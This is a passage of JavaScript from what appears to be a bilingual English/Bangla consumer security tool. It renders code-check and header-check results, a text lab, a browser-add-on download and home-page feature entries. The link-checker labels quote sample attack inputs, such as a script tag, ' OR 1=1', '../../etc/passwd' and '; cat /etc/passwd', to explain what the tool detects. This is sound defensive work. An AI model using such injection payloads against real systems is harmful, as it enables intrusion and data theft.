  const hdrs = xTable([h.field, h.value], Object.entries(r.headers).map(([k, v]) => [mono(k), esc(v.slice(0, 160))]));
  const cks = xTable(["name", "SameSite", "Secure", "HttpOnly", "issues"], r.cookies.map(c => [mono(c.name), esc(c.sameSite), String(c.secure), String(c.httpOnly), esc(c.issues.join(", ") || "–")]));
  const json = JSON.stringify(r, null, 2);
  return xConsole("headers", ["checks","hdrs","cookies","json"], {checks, hdrs, cookies:cks, json:`<pre class="xpre">${esc(json)}</pre>`}, json, "lx");
}

/* ---------- Code check ---------- */
function renderCode(el, r){
  const W = ws(), lvl = getLevel(), v = r.verdict, CR = W.cr, n = r.findings.length;
  if (lvl === "simple"){
    const reasons = [...new Set(r.findings.map(f => f.id))].slice(0, 3).map(id => ["code", CR[id][0] + ": " + CR[id][1]]);
    el.innerHTML = simpleCard(v, reasons, W.codeDos[v], {title:W.codeTitle(n), sub:W.codeSub[v]});
    el.querySelectorAll("[data-lvgo]").forEach(b => b.addEventListener("click", () => setLevel(b.dataset.lvgo)));
    return;
  }
  const items = r.findings.map(f => `<div class="cfi s-${f.sev}"><div class="cfh"><span class="hi">${ico("code")}</span><b>${esc(CR[f.id][0])}</b><span class="cwe">${esc(W.lineLbl)} ${f.line} · ${esc(f.cwe)}</span></div><pre class="cbad">${esc(f.snippet)}</pre><p class="small" style="margin:4px 0">${esc(CR[f.id][1])}</p><pre class="cgood"><b>${esc(W.safeWay)}:</b> ${esc(f.fix)}</pre></div>`).join("");
  el.innerHTML = `${vhead(v, W.codeTitle(n), W.codeSub[v], `<span class="when">${ico("code","width:15px;height:15px")}${esc(r.lang)} · ${r.lines} ${esc(W.linesLbl)}</span>`)}
    <div class="lsec">${items || `<p class="lnone">${ico("check")} ${esc(W.codeSub.low)}</p>`}</div>
    <div class="extras">${lessonChips(["sqli","cmdi","xss","pwhash","csrf"])}${lvl === "expert" ? codeConsole(r) : ""}</div>`;
  el.querySelectorAll("[data-lesson]").forEach(b => b.addEventListener("click", () => openLesson(b.dataset.lesson, ["sqli","cmdi","xss","pwhash","csrf"])));
  if (lvl === "expert") wireConsole("code", "lx");
}
function codeConsole(r){
  const L = lb().xh;
  const lines = xTable([ws().lineLbl, "rule", "CWE", L.sev, "code"], r.findings.map(f => [String(f.line), mono(f.id), mono(f.cwe), esc(f.sev), mono(f.snippet)]));
  const json = JSON.stringify(r, null, 2);
  return xConsole("code", ["lines","json"], {lines, json:`<pre class="xpre">${esc(json)}</pre>`}, json, "lx");
}

/* ---------- Lab text tools (called from renderLab) ---------- */
const labTexts = {};
function renderLabTextInput(){
  const W = ws(), k = labTab, ex = W.labEx[k];
  $("labIn").innerHTML = `<textarea id="labText" class="labta" spellcheck="false" placeholder="${esc(W.labPh[k])}"></textarea>
    <div class="bar" style="padding:10px 0 0"><button class="pill sky sm" type="button" id="labGo">${ico(LAB_ICON[k],"width:18px;height:18px")} ${esc(W.labGo[k])}</button>
    <label class="pill ghost sm labup">${ico("download","width:18px;height:18px")} <span>${LANG === "bn" ? "ফাইল দিন" : "Upload"}</span><input type="file" id="labFile2" accept="${k === "page" ? ".html,.htm,.eml,.txt,.mht" : k === "code" ? ".js,.ts,.py,.go,.c,.cpp,.h,.php,.java,.rb,.cs,.txt" : ".txt"}"></label></div>
    <p class="small" style="margin:8px 0 0">${esc(W.labHelp[k])}</p>
    <div class="exs"><span class="small" style="align-self:center;font-weight:700">${esc(lb().samplesLbl)}</span>${ex.map(x => `<button class="ex" type="button" data-ls="${x[0]}" ${tipS(lb().sampleTip)}><i style="background:var(${/^(safeEmail|headersGood|codeGood)$/.test(x[0]) ? "--low" : "--high"})"></i>${esc(x[1])}</button>`).join("")}</div>`;
  $("labText").value = labTexts[k] || ""; $("labText").addEventListener("input", e => { labTexts[k] = e.target.value; });
  $("labGo").addEventListener("click", () => runLabText($("labText").value, k === "page" ? (LANG === "bn" ? "পেস্ট করা পেজ" : "pasted page") : ""));
  $("labIn").querySelectorAll("[data-ls]").forEach(b => b.addEventListener("click", () => { $("labText").value = WEB_SAMPLES[b.dataset.ls]; runLabText(WEB_SAMPLES[b.dataset.ls], b.textContent.trim()); }));
  $("labFile2").addEventListener("change", async e => { const f = e.target.files && e.target.files[0]; if (!f) return; if (f.size > 2 * 1024 * 1024){ labErr("too_big"); return; } const txt = await f.text(); $("labText").value = txt.slice(0, 200000); runLabText(txt, f.name.slice(0, 80)); e.target.value = ""; });
}
function runLabText(txt, name){
  const k = labTab; labTexts[k] = String(txt).slice(0, 200000); if (!String(txt).trim()){ $("labText").focus(); return; }
  if (k === "page") pageRes = Object.assign(pageScan(txt), {name:name || "page"});
  else if (k === "headers") hdrRes = headerCheck(txt);
  else codeRes = codeScan(txt);
  renderLabOut();
}
function renderLabTextOut(){
  const out = $("labOut"), k = labTab, r = k === "page" ? pageRes : k === "headers" ? hdrRes : codeRes;
  if (!r){ const e = {page:[ws().labTabs.page[0], ws().labHelp.page, ART.mailxray], headers:[ws().labTabs.headers[0], ws().labHelp.headers, ART.webcheck], code:[ws().labTabs.code[0], ws().labHelp.code, ART.codecheck]}[k]; out.innerHTML = `<div class="empty"><div style="max-width:240px;margin:0 auto 10px">${e[2]}</div><h3 style="margin:0 0 4px;font:800 22px var(--disp)">${esc(e[0])}</h3><p class="small" style="margin:0;font-size:15px">${esc(e[1])}</p></div>`; return; }
  if (r.status !== "complete"){ out.innerHTML = `<div class="empty"><h3>${esc(LANG === "bn" ? "কিছু পাওয়া যায়নি। আবার পেস্ট করুন।" : "Nothing to read. Please paste again.")}</h3></div>`; return; }
  if (k === "page") renderPageXray(out, r, r.name, "lab", "lx"); else if (k === "headers") renderHeaders(out, r); else renderCode(out, r);
}
function labTextSample(k){ const key = {page:"phishEmail", headers:"headersBad", code:"codeBad"}[labTab]; if ($("labText")) $("labText").value = WEB_SAMPLES[key]; runLabText(WEB_SAMPLES[key], ws().labEx[labTab][0][1]); }

/* ---------- Browser Shield section ---------- */
function renderShield(){
  const W = ws(), box = $("shield"); if (!box) return;
  $("shTitle").textContent = W.shTitle; $("shSub").textContent = W.shSub;
  $("shBody").innerHTML = `<div class="shcard"><div class="shpic">${ART.shieldext}</div><div><div class="shfeats">${W.shFeat.map(f => `<div class="shf">${ico(f[0])}<span>${esc(f[1])}</span></div>`).join("")}</div>
    <div class="bar" style="padding:12px 0 6px"><a class="pill sky" href="extension/FraudShield_BD_Browser_Shield.zip" download>${ico("download","width:18px;height:18px")} ${esc(W.shGet)}</a></div>
    <ol class="shsteps">${W.shSteps.map(s => `<li>${esc(s)}</li>`).join("")}</ol><p class="small" style="margin:0">${ico("info","width:15px;height:15px;vertical-align:-3px")} ${esc(W.shNote)}</p></div></div>`;
}

/* ---------- link checker: labels for attack code hidden inside a link ---------- */
Object.assign(T.en.linkFlag, {
  xss_payload:["Script hidden in the link (XSS)", "The link carries <script> or similar code. Even a real website can be tricked into running it as you (reflected XSS)."],
  sqli_payload:["Database attack in the link (SQL injection)", "The link carries SQL code like ' OR 1=1 that tries to trick the site's database."],
  traversal_payload:["Secret-file trick (path traversal)", "The link asks for files like ../../etc/passwd that should never be shown."],
  cmd_payload:["Command trick (command injection)", "The link tries to make the server run a command such as ; cat /etc/passwd."],
  open_redirect:["Sends you onward to another site", "A real site's link forwards you to a different website. Scammers use this to borrow a trusted name."],
  encoded_obfuscation:["Heavily disguised text", "Parts of the link are encoded several times over to hide what they say."]
});
Object.assign(T.bn.linkFlag, {
  xss_payload:["লিংকে লুকানো স্ক্রিপ্ট (XSS)", "লিংকে <script> বা এমন কোড আছে। আসল সাইটকেও ধোঁকা দিয়ে আপনার হয়ে এটা চালানো যায় (reflected XSS)।"],
  sqli_payload:["লিংকে ডেটাবেস হামলা (SQL injection)", "লিংকে ' OR 1=1-এর মতো SQL কোড আছে, যা সাইটের ডেটাবেসকে ধোঁকা দিতে চায়।"],
  traversal_payload:["গোপন ফাইলের চালাকি (path traversal)", "লিংকটা ../../etc/passwd-এর মতো ফাইল চায়, যা কখনো দেখানোর কথা না।"],
  cmd_payload:["কমান্ডের চালাকি (command injection)", "লিংকটা সার্ভারে ; cat /etc/passwd-এর মতো কমান্ড চালাতে চায়।"],
  open_redirect:["অন্য সাইটে পাঠিয়ে দেয়", "আসল সাইটের লিংক আপনাকে অন্য ওয়েবসাইটে পাঠিয়ে দেয়। স্ক্যামাররা বিশ্বস্ত নাম ধার করতে এটা ব্যবহার করে।"],
  encoded_obfuscation:["অনেক লুকানো লেখা", "কী লেখা আছে তা লুকাতে লিংকের কিছু অংশ কয়েকবার এনকোড করা।"]
});
Object.assign(LV.en.plainLink, {payload:"This link hides attack code. Don't open it, even though the website may be real.", redirect:"This link secretly forwards you to another website."});
Object.assign(LV.bn.plainLink, {payload:"এই লিংকে হামলার কোড লুকানো। ওয়েবসাইট আসল হলেও খুলবেন না।", redirect:"এই লিংক গোপনে আপনাকে অন্য ওয়েবসাইটে পাঠিয়ে দেয়।"});

/* ---------- File tab: saved emails and web pages get the page X-ray ---------- */
const PAGE_FILE = /\.(html?|xhtml|eml|mht|mhtml)$/i;
function decodeMailText(bytes){
  let s = new TextDecoder("utf-8", {fatal:false}).decode(bytes.slice(0, 2 * 1024 * 1024));
  if (/content-transfer-encoding:\s*quoted-printable/i.test(s)) s = s.replace(/=\r?\n/g, "").replace(/=([0-9A-F]{2})/gi, (_, h) => String.fromCharCode(parseInt(h, 16)));
  return s;
}
SAMPLE_FILES.phish = {name:"sample_phishing_email.html", b64:btoa(unescape(encodeURIComponent(WEB_SAMPLES.phishEmail)))};
T.en.fileEx.push(["phish", "Phishing email (HTML)"]); T.bn.fileEx.push(["phish", "ফিশিং ইমেইল (HTML)"]);

/* ---------- Home: services grid + "layers" strip get the new tools ---------- */
T.en.services.splice(3, 0, {id:"pass", icon:"lock", label:"Password", tip:"Is my password strong?|See how fast a thief could guess it, make a strong one, and check if it leaked.", g:["#4ADE80","#16A34A"], badge:"NEW"});
T.bn.services.splice(3, 0, {id:"pass", icon:"lock", label:"পাসওয়ার্ড", tip:"আমার পাসওয়ার্ড কি শক্ত?|চোর কত তাড়াতাড়ি অনুমান করতে পারে দেখুন, শক্ত একটা বানান, ফাঁস হয়েছে কি না দেখুন।", g:["#4ADE80","#16A34A"], badge:"NEW"});
T.en.services.push({id:"shield", icon:"shield", label:"Browser Shield", tip:"Protection on every website|A Chrome/Edge add-on that stops fake logins, clickjacking and CSRF while you browse.", g:["#38BDF8","#1D4ED8"], badge:"NEW"});
T.bn.services.push({id:"shield", icon:"shield", label:"ব্রাউজার শিল্ড", tip:"সব ওয়েবসাইটে সুরক্ষা|Chrome/Edge অ্যাড-অন, ব্রাউজ করার সময় নকল লগইন, ক্লিকজ্যাকিং আর CSRF থামায়।", g:["#38BDF8","#1D4ED8"], badge:"NEW"});
(function(){
  const add = (L, rows) => { const i = T[L].feats.findIndex(f => f[4] === "lab"); T[L].feats.splice(i, 0, ...rows); };
  add("en", [["lock","NEW","Password check","How fast could a thief guess it online, or after a site leak? Makes 7-word passwords, checks leaks with only 5 characters of a hash, explains two-step login and relay attacks.","pass","#4ADE80","#16A34A"],
             ["shield","NEW","Browser Shield","A Chrome/Edge add-on: a safety pause before passwords go to fake or unlocked pages, reveals invisible frames (clickjacking), blocks hidden form sends (CSRF), warns on links with XSS/SQL code.","shield","#38BDF8","#1D4ED8"]]);
  add("bn", [["lock","NEW","পাসওয়ার্ড চেক","অনলাইনে বা সাইট থেকে ফাঁস হলে চোর কত তাড়াতাড়ি অনুমান করবে? ৭ শব্দের পাসওয়ার্ড বানায়, হ্যাশের মাত্র ৫টা অক্ষর দিয়ে ফাঁস চেক করে, টু-স্টেপ লগইন আর রিলে অ্যাটাক বোঝায়।","pass","#4ADE80","#16A34A"],
             ["shield","NEW","ব্রাউজার শিল্ড","Chrome/Edge অ্যাড-অন: নকল বা তালা ছাড়া পেজে পাসওয়ার্ড যাওয়ার আগে সেফটি বিরতি, অদৃশ্য ফ্রেম দেখায় (ক্লিকজ্যাকিং), লুকানো ফর্ম পাঠানো আটকায় (CSRF), XSS/SQL কোডওয়ালা লিংকে সাবধান করে।","shield","#38BDF8","#1D4ED8"]]);
  const lab = L => T[L].feats.find(f => f[4] === "lab");
  lab("en")[3] = "Wireshark-lite for everyone: Wi-Fi captures (fake routers, fake DNS, open passwords), server logs (early DDoS, password guessing, CSRF), page & email X-ray, website header grade and code check for SQLi, XSS and command injection.";
  lab("bn")[3] = "সবার জন্য সহজ Wireshark: Wi-Fi ক্যাপচার (নকল রাউটার, নকল DNS, খোলা পাসওয়ার্ড), সার্ভার লগ (আগাম DDoS, পাসওয়ার্ড অনুমান, CSRF), পেজ ও ইমেইল এক্স-রে, ওয়েবসাইট হেডার গ্রেড আর SQLi, XSS, কমান্ড ইনজেকশনের কোড চেক।";
  T.en.ftTitle = T.en.feats.length + " layers of protection"; T.bn.ftTitle = T.bn.feats.length.toString().replace(/\d/g, d => "০১২৩৪৫৬৭৮৯"[d]) + " স্তরের সুরক্ষা";
})();
